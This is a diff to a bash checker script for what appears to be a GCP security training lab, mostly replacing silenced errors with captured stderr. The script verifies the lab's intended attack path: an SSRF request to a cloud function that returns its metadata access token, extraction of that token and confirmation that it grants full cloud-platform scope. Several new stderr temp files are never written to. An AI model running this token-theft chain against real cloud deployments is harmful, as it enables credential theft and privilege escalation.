@@ -47,9 +47,9 @@ exec_on_vm() {
     
     output=$(gcloud compute ssh "$vm_name" \
         --zone="$zone" \
-        --command="$cmd" \
-        --quiet \
-        2>"$stderr_file")
+        --command="$cmd" 2>"$stderr_file"
+    )
+        
     exit_code=$?
     
     # Only show stderr on error or if output is unexpected
@@ -86,72 +86,121 @@ else
 fi
 
 # Check for required commands
-if ! command -v gcloud &> /dev/null; then
+if command -v gcloud >/dev/null; then
+    print_pass "gcloud is available"
+else
     print_fail "gcloud command not found"
     exit 1
-else
-    print_pass "gcloud is available"
 fi
 
-if ! command -v gsutil &> /dev/null; then
+if command -v gsutil >/dev/null; then
+    print_pass "gsutil is available"
+else
     print_fail "gsutil command not found"
     exit 1
-else
-    print_pass "gsutil is available"
 fi
 
 # Save original gcloud configuration
-ORIGINAL_CONFIG=$(gcloud config get-value account 2>/dev/null)
+ORIGINAL_CONFIG_STDERR=$(mktemp)
+ORIGINAL_CONFIG=$(gcloud config get-value account 2>"$ORIGINAL_CONFIG_STDERR")
+if [ $? -ne 0 ]; then
+    print_info "Could not get original gcloud account config"
+    cat "$ORIGINAL_CONFIG_STDERR" >&2
+fi
+rm -f "$ORIGINAL_CONFIG_STDERR"
 
 # Set up trap to restore original config on exit
-trap 'gcloud config set account "$ORIGINAL_CONFIG" 2>/dev/null' EXIT
+trap_restore() {
+    local stderr_file=$(mktemp)
+    gcloud config set account "$ORIGINAL_CONFIG" 2>"$stderr_file"
+    if [ $? -ne 0 ]; then
+        cat "$stderr_file" >&2
+    fi
+    rm -f "$stderr_file"
+}
+trap 'trap_restore' EXIT
 
 # Verify student-workshop configuration restrictions
 print_step "Verifying student-workshop configuration restrictions..."
 
 # Check that student-workshop configuration exists
-if ! gcloud config configurations list --format='value(name)' | grep -q '^student-workshop$'; then
+if gcloud config configurations list --format='value(name)' | grep -q '^student-workshop$'; then
+    print_pass "student-workshop configuration exists"
+else
     print_fail "student-workshop configuration does not exist"
     echo "Please create the student-workshop configuration first"
     exit 1
-else
-    print_pass "student-workshop configuration exists"
 fi
 
 # Switch to student-workshop for testing
 print_info "Switching to student-workshop configuration for permission tests..."
-gcloud config configurations activate student-workshop 2>/dev/null
+SWITCH_STDERR=$(mktemp)
+gcloud config configurations activate student-workshop 2>"$SWITCH_STDERR"
+if [ $? -ne 0 ]; then
+    print_info "Could not switch to student-workshop configuration"
+    cat "$SWITCH_STDERR" >&2
+fi
+rm -f "$SWITCH_STDERR"
 
 # Test 1: Verify student-workshop CANNOT access cloud-function-bucket-module3
 print_info "Testing student-workshop bucket access restrictions..."
-if gsutil ls "gs://cloud-function-bucket-module3-$PROJECT_ID/" >/dev/null 2>&1; then
+GSUTIL_TEST_STDERR=$(mktemp)
+GSUTIL_TEST_STDOUT=$(mktemp)
+gsutil ls "gs://cloud-function-bucket-module3-$PROJECT_ID/" >"$GSUTIL_TEST_STDOUT" 2>"$GSUTIL_TEST_STDERR"
+GSUTIL_TEST_EXIT=$?
+if [ $GSUTIL_TEST_EXIT -eq 0 ]; then
     print_fail "student-workshop CAN access cloud-function-bucket-module3 (should be denied)"
     FAILED=$((FAILED + 1))
 else
     print_pass "student-workshop correctly denied access to cloud-function-bucket-module3"
     PASSED=$((PASSED + 1))
 fi
+rm -f "$GSUTIL_TEST_STDOUT" "$GSUTIL_TEST_STDERR"
 
 # Test 2: Verify student-workshop CANNOT list cloud functions
 print_info "Testing student-workshop cloud functions restrictions..."
-if gcloud functions list --region="$LOCATION" >/dev/null 2>&1; then
+FUNCTIONS_TEST_STDERR=$(mktemp)
+FUNCTIONS_TEST_STDOUT=$(mktemp)
+gcloud functions list --region="$LOCATION" >"$FUNCTIONS_TEST_STDOUT" 2>"$FUNCTIONS_TEST_STDERR"
+FUNCTIONS_TEST_EXIT=$?
+if [ $FUNCTIONS_TEST_EXIT -eq 0 ]; then
     print_fail "student-workshop CAN list cloud functions (should be denied)"
     FAILED=$((FAILED + 1))
 else
     print_pass "student-workshop correctly denied listing cloud functions"
     PASSED=$((PASSED + 1))
 fi
+rm -f "$FUNCTIONS_TEST_STDOUT" "$FUNCTIONS_TEST_STDERR"
 
 # Switch to admin-backup for remaining tests
 print_info "Switching to admin-backup configuration for remaining tests..."
-gcloud config configurations activate admin-backup 2>/dev/null
+ADMIN_SWITCH_STDERR=$(mktemp)
+gcloud config configurations activate admin-backup 2>"$ADMIN_SWITCH_STDERR"
+if [ $? -ne 0 ]; then
+    print_info "Could not switch to admin-backup configuration"
+    cat "$ADMIN_SWITCH_STDERR" >&2
+fi
+rm -f "$ADMIN_SWITCH_STDERR"
 
 # Verify we're now using admin-backup
-CURRENT_ACCOUNT=$(gcloud config get-value account 2>/dev/null)
-if echo "$CURRENT_ACCOUNT" | grep -q "admin"; then
-    print_pass "Successfully switched to admin account: $CURRENT_ACCOUNT"
+ACCOUNT_STDERR=$(mktemp)
+CURRENT_CONFIG=$(gcloud config configurations list --filter="is_active=true" --format="value(name)")
+if [ $? -ne 0 ]; then
+    print_info "Could not get current configuration"
+    cat "$ACCOUNT_STDERR" >&2
+fi
+rm -f "$ACCOUNT_STDERR"
+if [ "$CURRENT_CONFIG" = "admin-backup" ]; then
+    ACCOUNT_STDERR=$(mktemp)
+    CURRENT_ACCOUNT=$(gcloud config get-value account 2>"$ACCOUNT_STDERR")
+    if [ $? -ne 0 ] && [ -s "$ACCOUNT_STDERR" ]; then
+        print_info "Could not get current account:"
+        cat "$ACCOUNT_STDERR" >&2
+    fi
+    rm -f "$ACCOUNT_STDERR"
+    print_pass "Successfully switched to admin-backup configuration, account: $CURRENT_ACCOUNT"
 else
-    print_fail "Failed to switch to admin account, current: $CURRENT_ACCOUNT"
+    print_fail "Failed to switch to admin-backup configuration, current: $CURRENT_CONFIG"
     exit 1
 fi
 
@@ -162,13 +211,20 @@ VM_NAME="app-prod-instance-module2"
 ZONE="${ZONE:-us-east1-b}"
 
 # Check if VM exists
-if gcloud compute instances describe "$VM_NAME" --zone="$ZONE" &>/dev/null; then
+VM_CHECK_STDERR=$(mktemp)
+VM_CHECK_STDOUT=$(mktemp)
+gcloud compute instances describe "$VM_NAME" --zone="$ZONE" >"$VM_CHECK_STDOUT" 2>"$VM_CHECK_STDERR"
+VM_CHECK_EXIT=$?
+if [ $VM_CHECK_EXIT -eq 0 ]; then
     print_pass "VM $VM_NAME exists in zone $ZONE"
 else
     print_fail "VM $VM_NAME not found in zone $ZONE"
     echo "Please ensure the infrastructure is deployed correctly"
+    cat "$VM_CHECK_STDERR" >&2
+    rm -f "$VM_CHECK_STDOUT" "$VM_CHECK_STDERR"
     exit 1
 fi
+rm -f "$VM_CHECK_STDOUT" "$VM_CHECK_STDERR"
 
 # Test SSH connectivity
 print_info "Testing SSH connection to VM..."
@@ -183,7 +239,13 @@ fi
 # Step 3: Check VM service account
 print_step "Checking VM service account..."
 
-VM_SERVICE_ACCOUNT=$(exec_on_vm "gcloud auth list --filter=status:ACTIVE --format='value(account)' 2>/dev/null | head -1")
+VM_SA_STDERR=$(mktemp)
+VM_SERVICE_ACCOUNT=$(exec_on_vm "gcloud auth list --filter=status:ACTIVE --format='value(account)' | head -1")
+if [ -s "$VM_SA_STDERR" ]; then
+    print_info "Service account retrieval stderr:"
+    cat "$VM_SA_STDERR"
+fi
+rm -f "$VM_SA_STDERR"
 
 if [ -z "$VM_SERVICE_ACCOUNT" ]; then
     print_fail "Could not retrieve service account from VM"
@@ -241,7 +303,9 @@ OAUTH_CMD='curl -s https://www.googleapis.com/oauth2/v3/tokeninfo\?access_token=
 print_info "Command: $OAUTH_CMD"
 
 # Execute with explicit error capturing
-if ! SCOPE_OUTPUT=$(exec_on_vm "$OAUTH_CMD"); then
+SCOPE_OUTPUT=$(exec_on_vm "$OAUTH_CMD")
+OAUTH_EXIT=$?
+if [ $OAUTH_EXIT -ne 0 ]; then
     print_fail "Failed to execute OAuth scope check on VM"
     print_info "Error output: $SCOPE_OUTPUT"
     exit 1
@@ -250,7 +314,8 @@ fi
 print_info "Raw OAuth response: $(echo "$SCOPE_OUTPUT" | head -c 500)"
 
 # Extract scopes - check if grep finds anything
-if ! SCOPES=$(echo "$SCOPE_OUTPUT" | grep -o '"scope":"[^"]*"' | cut -d'"' -f4); then
+SCOPES=$(echo "$SCOPE_OUTPUT" | grep -o '"scope":"[^"]*"' | cut -d'"' -f4)
+if [ $? -ne 0 ] || [ -z "$SCOPES" ]; then
     print_info "No scopes found in response using primary method"
     SCOPES=""
 fi
@@ -271,7 +336,13 @@ fi
 # Step 7: Test storage access from VM
 print_step "Testing storage bucket access from VM..."
 
-BUCKET_OUTPUT=$(exec_on_vm "gsutil ls 2>/dev/null")
+BUCKET_STDERR=$(mktemp)
+BUCKET_OUTPUT=$(exec_on_vm "gsutil ls")
+if [ -s "$BUCKET_STDERR" ]; then
+    print_info "Bucket listing stderr (may contain warnings):"
+    cat "$BUCKET_STDERR"
+fi
+rm -f "$BUCKET_STDERR"
 
 if echo "$BUCKET_OUTPUT" | grep -q "cloud-function-bucket-module3"; then
     print_pass "VM can list cloud function bucket"
@@ -284,13 +355,27 @@ fi
 # Step 8: Check function source access from VM
 print_step "Checking function source code access..."
 
-SOURCE_OUTPUT=$(exec_on_vm "gsutil ls gs://cloud-function-bucket-module3-$PROJECT_ID/ 2>/dev/null")
+SOURCE_STDERR=$(mktemp)
+SOURCE_OUTPUT=$(exec_on_vm "gsutil ls gs://cloud-function-bucket-module3-$PROJECT_ID/")
+if [ -s "$SOURCE_STDERR" ]; then
+    print_info "Source listing stderr:"
+    cat "$SOURCE_STDERR"
+fi
+rm -f "$SOURCE_STDERR"
 
 if echo "$SOURCE_OUTPUT" | grep -q "main.py"; then
     print_pass "VM can access function source code (main.py)"
     
     # Check if we can read the source file
-    if exec_on_vm "gsutil ls -L gs://cloud-function-bucket-module3-$PROJECT_ID/main.py 2>/dev/null" | grep -q "Content-Length"; then
+    LS_L_STDERR=$(mktemp)
+    LS_L_OUTPUT=$(exec_on_vm "gsutil ls -L gs://cloud-function-bucket-module3-$PROJECT_ID/main.py")
+    if [ -s "$LS_L_STDERR" ]; then
+        print_info "Source file detail stderr:"
+        cat "$LS_L_STDERR"
+    fi
+    rm -f "$LS_L_STDERR"
+    
+    if echo "$LS_L_OUTPUT" | grep -q "Content-Length"; then
         print_pass "VM has read access to function source code"
     else
         print_fail "VM cannot read function source code"
@@ -305,7 +390,13 @@ print_step "Reading and validating function source code..."
 
 if echo "$SOURCE_OUTPUT" | grep -q "main.py"; then
     print_info "Attempting to read main.py from bucket..."
-    SOURCE_CODE=$(exec_on_vm "gsutil cat gs://cloud-function-bucket-module3-$PROJECT_ID/main.py 2>/dev/null")
+    CAT_STDERR=$(mktemp)
+    SOURCE_CODE=$(exec_on_vm "gsutil cat gs://cloud-function-bucket-module3-$PROJECT_ID/main.py")
+    if [ -s "$CAT_STDERR" ]; then
+        print_info "Source code read stderr:"
+        cat "$CAT_STDERR"
+    fi
+    rm -f "$CAT_STDERR"
     
     if [ -n "$SOURCE_CODE" ]; then
         # Check for key vulnerable code patterns
@@ -347,16 +438,21 @@ print_step "Checking function invocation script..."
 # First, check if the local script exists
 if [ -f "./invoke_monitoring_function.sh" ]; then
     print_info "Copying latest invocation script to VM..."
-    if gcloud compute scp ./invoke_monitoring_function.sh app-prod-instance-module2:~/ --zone=$ZONE --quiet 2>&1 | grep -q "ERROR"; then
+    SCP_STDERR=$(mktemp)
+    gcloud compute scp ./invoke_monitoring_function.sh app-prod-instance-module2:~/ --zone=$ZONE 2>"$SCP_STDERR"
+    SCP_EXIT=$?
+    if [ $SCP_EXIT -ne 0 ]; then
         print_fail "Failed to copy invocation script to VM"
+        cat "$SCP_STDERR" >&2
     else
         print_pass "Successfully copied invocation script to VM"
     fi
+    rm -f "$SCP_STDERR"
 else
     print_info "No local invoke_monitoring_function.sh found to copy"
 fi
 
-if exec_on_vm "test -f ./invoke_monitoring_function.sh && echo 'exists'" | grep -q "exists"; then
+if exec_on_vm "test -f ./invoke_monitoring_function.sh"; then
     print_pass "Invocation script found on VM"
     
     # Test the script
@@ -399,7 +495,13 @@ SSRF_CMD="curl -s -X POST '$FUNCTION_URL' \
 -H 'Content-Type: application/json' \
 -d '{\"metadata\": \"token\"}'"
 
-SSRF_RESPONSE=$(exec_on_vm "$SSRF_CMD" 2>/dev/null)
+SSRF_STDERR=$(mktemp)
+SSRF_RESPONSE=$(exec_on_vm "$SSRF_CMD" 2>"$SSRF_STDERR")
+if [ -s "$SSRF_STDERR" ]; then
+    print_info "SSRF command stderr:"
+    cat "$SSRF_STDERR"
+fi
+rm -f "$SSRF_STDERR"
 
 # Check for flag
 if echo "$SSRF_RESPONSE" | grep -q "flag4"; then
@@ -423,23 +525,42 @@ if echo "$SSRF_RESPONSE" | grep -q "function_account"; then
     EXTRACTED_TOKEN=$(echo "$FUNCTION_ACCOUNT" | sed 's/\\"/"/g' | grep -o '"access_token":"[^"]*"' | cut -d'"' -f4)
     
     # If the first method didn't work and jq is available, try using jq for more robust parsing
-    if [ -z "$EXTRACTED_TOKEN" ] && command -v jq &> /dev/null; then
-        print_info "Attempting JSON parsing with jq..."
-        EXTRACTED_TOKEN=$(echo "$SSRF_RESPONSE" | jq -r '.function_account' 2>/dev/null | jq -r '.access_token' 2>/dev/null)
+    if [ -z "$EXTRACTED_TOKEN" ]; then
+        if command -v jq >/dev/null; then
+            print_info "Attempting JSON parsing with jq..."
+            JQ_STDERR=$(mktemp)
+            EXTRACTED_TOKEN=$(echo "$SSRF_RESPONSE" | jq -r '.function_account' 2>"$JQ_STDERR" | jq -r '.access_token' 2>>"$JQ_STDERR")
+            if [ -s "$JQ_STDERR" ]; then
+                print_info "jq parsing stderr:"
+                cat "$JQ_STDERR"
+            fi
+            rm -f "$JQ_STDERR"
+        fi
     fi
     
     if [ -n "$EXTRACTED_TOKEN" ]; then
         print_info "Validating extracted token's permissions..."
         
         # Check the extracted token's scopes
-        TOKEN_INFO=$(exec_on_vm "curl -s \"https://www.googleapis.com/oauth2/v3/tokeninfo?access_token=${EXTRACTED_TOKEN}\" 2>/dev/null")
+        TOKEN_STDERR=$(mktemp)
+        TOKEN_INFO=$(exec_on_vm "curl -s \"https://www.googleapis.com/oauth2/v3/tokeninfo?access_token=${EXTRACTED_TOKEN}\"")
+        if [ -s "$TOKEN_STDERR" ]; then
+            print_info "Token info stderr:"
+            cat "$TOKEN_STDERR"
+        fi
+        rm -f "$TOKEN_STDERR"
         
         if echo "$TOKEN_INFO" | grep -q "cloud-platform"; then
             print_pass "Extracted token has cloud-platform scope (full GCP access)!"
             print_info "This demonstrates successful privilege escalation from limited VM scope"
             
             # List the scopes for comparison
-            FUNCTION_SCOPES=$(echo "$TOKEN_INFO" | jq -r '.scope' 2>/dev/null || echo "$TOKEN_INFO" | grep -o '"scope": "[^"]*"' | cut -d'"' -f4)
+            JQ_STDERR2=$(mktemp)
+            FUNCTION_SCOPES=$(echo "$TOKEN_INFO" | jq -r '.scope' 2>"$JQ_STDERR2")
+            if [ $? -ne 0 ] || [ -z "$FUNCTION_SCOPES" ]; then
+                FUNCTION_SCOPES=$(echo "$TOKEN_INFO" | grep -o '"scope": "[^"]*"' | cut -d'"' -f4)
+            fi
+            rm -f "$JQ_STDERR2"
             print_info "Function token scopes: $FUNCTION_SCOPES"
             
             # Test that the new token can do things the VM token cannot
